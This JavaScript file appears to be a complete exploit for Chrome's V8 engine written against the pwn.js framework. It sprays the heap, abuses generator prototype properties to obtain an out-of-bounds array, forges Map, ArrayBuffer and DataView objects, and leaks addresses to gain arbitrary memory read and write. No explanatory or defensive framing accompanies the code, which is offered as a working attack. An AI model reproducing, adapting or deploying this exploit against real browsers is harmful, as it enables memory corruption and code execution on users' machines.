var Exploit = (function() {
    var ChromeExploit = pwnjs.ChromeExploit,
        Integer = pwnjs.Integer,
        setInt32 = DataView.prototype.setInt32;

    function Exploit() {
        ChromeExploit.call(this);

        /* We are going to modify these ArrayBuffers rather than keep a reference to a fake DataView. */
        this.manager_ab = new ArrayBuffer(8);
        this.target_ab = new ArrayBuffer(8);
        this.manager_dv = new DataView(this.manager_ab);
        this.dv = new DataView(this.target_ab);

        /* Helpers to convert between double and int64. */
        var f64 = new Float64Array(1);
        var u32 = new Uint32Array(f64.buffer);
        function d2u(v) {
            f64[0] = v;
            return u32;
        }
        function u2d(lo, hi) {
            u32[0] = lo;
            u32[1] = hi;
            return f64[0];
        }

        var packed_dbl_arr = [1, 2, 3, 4.4, 5.5, 6.6];
        var packed_ele_arr = [0x13371337, 0, {}, 0];
        var spray_arr = new Array(2*1024*1024);
        var spray_idx = 0;
        function spray() {
            if (spray_idx >= 2*1024*1024) {
                return false;
            }
            for (let i = 0; i < (1024 * 1024) / 16; i++) {
                tmp = packed_dbl_arr.slice(0);
                spray_arr[spray_idx++] = tmp;
                tmp = packed_ele_arr.slice(0);
                tmp[1] = spray_idx;
                spray_arr[spray_idx++] = tmp;
            }
        }

        var keys = [];
        for (let i = 0; i < 1022; i++) {
            keys.push('b' + i);
        }

        spray();
        spray();

        function* generator() {
        }

        for (let i = 0; i < 1022; i++) {
            generator.prototype[keys[i]];
            generator.prototype[keys[i]] = 0x1234;
        }

        var oob = null;
        while (oob === null) {
            if (spray() === false) {
                throw 'exploit failed';
            }
            if (generator.prototype[keys[3]] == 6) {
                generator.prototype[keys[3]] = 1000000;
                for (let i = 0; i < spray_idx; i++) {
                    if (spray_arr[i].length == 1000000) {
                        oob = spray_arr[i];
                        break;
                    }
                }
            }
        }

        var fake_map_obj = [
            /* Fake Map object */
            u2d(0, 0),
            u2d(0, 0x1000c8),
            u2d(0, 0),
            u2d(0, 0),

            /* Fake ArrayBuffer object */
            u2d(0, 0),
            u2d(0, 0),
            u2d(0, 0),
            u2d(0, 0),
            u2d(0x43434343, 0x44444444),
            u2d(0, 0),
        ].slice(0);

        var leak_idx;
        var target_idx;
        for (let i = 0; i < 100; i++) {
            try {
                if (d2u(oob[i])[1] == 0x13371337) {
                    leak_idx = i;
                    break;
                }
            } catch (e) {
            }
        }

        if (leak_idx === undefined) {
            throw 'unable to find target array';
        }

        target_idx = d2u(oob[leak_idx + 1])[1];
        if (spray_arr[target_idx] === undefined) {
            throw 'exploit failed';
        }

        spray_arr[target_idx][2] = fake_map_obj;
        var fake_map_lo = d2u(oob[leak_idx + 2])[0] - 1 + 0x30;
        var fake_map_hi = d2u(oob[leak_idx + 2])[1];

        var fake_dv_obj = [
            u2d(fake_map_lo + 1, fake_map_hi),
            u2d(0, 0),
            u2d(0, 0),
            u2d(fake_map_lo + 0x20 + 1, fake_map_hi),
            u2d(0, 0),
            u2d(0, 0x4000),
        ].slice(0);

        spray_arr[target_idx][2] = fake_dv_obj;
        var fake_dv_lo = d2u(oob[leak_idx + 2])[0] - 1 + 0x30;
        var fake_dv_hi = d2u(oob[leak_idx + 2])[1];

        oob[leak_idx + 3] = u2d(fake_dv_lo + 1, fake_dv_hi);

        /* Leak address of manager ArrayBuffer. This should be in the old space. */
        spray_arr[target_idx][2] = this.manager_ab;
        var manager_ab_lo = d2u(oob[leak_idx + 2])[0] - 1;
        var manager_ab_hi = d2u(oob[leak_idx + 2])[1];

        /* Leak address of target ArrayBuffer. This should be in the old space. */
        spray_arr[target_idx][2] = this.target_ab;
        var target_ab_lo = d2u(oob[leak_idx + 2])[0] - 1;
        var target_ab_hi = d2u(oob[leak_idx + 2])[1];

        /* Use fake DataView to setup manager ArrayBuffer to control address of target ArrayBuffer. */
        fake_map_obj[8] = u2d(manager_ab_lo + 0x20, manager_ab_hi);
        setInt32.call(spray_arr[target_idx][3], 0, target_ab_lo + 0x20, true);
        setInt32.call(spray_arr[target_idx][3], 4, target_ab_hi, true);

        var mem_chunk = this.Uint64Ptr.cast(new Integer(fake_map_lo & 0xFFF80000, fake_map_hi));
        var semi_space = this.Uint64Ptr.cast(mem_chunk[6].and(new Integer(7).not()));
        var vtable = semi_space[0];

        /* Drop references to corrupted objects. Otherwise scavenge will try to move to old space. */
        oob = null;
        spray_arr[target_idx][3] = null;
        spray_arr = null;

        /* Finish pwn.js initialization. This will likely cause GC or scavenge. */
        this.initChrome(vtable);
    }
    Exploit.prototype = Object.create(ChromeExploit.prototype);
    Exploit.prototype.constructor = Exploit;
    Exploit.prototype.read = function (address, size) {
        this.manager_dv.setInt32(0, address.low, true);
        this.manager_dv.setInt32(4, address.high, true);

        switch (size) {
            case 8: return new Integer(this.dv.getInt8(0, true), 0, true);
            case 16: return new Integer(this.dv.getInt16(0, true), 0, true);
            case 32: return new Integer(this.dv.getInt32(0, true), 0, true);
            case 64: return new Integer(this.dv.getInt32(0, true), this.dv.getInt32(4, true), true);
        }
    }
    Exploit.prototype.write = function (address, value, size) {
        this.manager_dv.setInt32(0, address.low, true);
        this.manager_dv.setInt32(4, address.high, true);

        switch (size) {
            case 8: return this.dv.setInt8(0, value.low|0, true);
            case 16: return this.dv.setInt16(0, value.low|0, true);
            case 32: return this.dv.setInt32(0, value.low|0, true);
            case 64:
                this.dv.setInt32(0, value.low|0, true);
                this.dv.setInt32(4, value.high|0, true);
        }
    }
    return Exploit;
})();
